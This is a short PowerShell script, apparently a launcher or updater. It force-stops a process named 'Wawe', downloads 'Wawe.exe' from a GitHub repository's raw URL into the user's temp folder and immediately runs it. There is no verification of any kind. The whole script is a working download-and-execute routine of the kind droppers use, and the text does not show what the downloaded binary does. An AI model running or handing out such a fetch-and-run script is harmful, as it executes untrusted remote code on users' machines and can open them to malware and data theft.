$base = 'https://github.com/jesuss13377-source/wa/raw/refs/heads/main/'
$d = "$env:TEMP\Wawe.exe"

Stop-Process -Name Wawe -Force -ErrorAction SilentlyContinue
Remove-Item $d -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

Invoke-WebRequest -Uri ($base + 'Wawe.exe') -OutFile $d -UseBasicParsing

if (Test-Path $d) { Start-Process -FilePath $d }
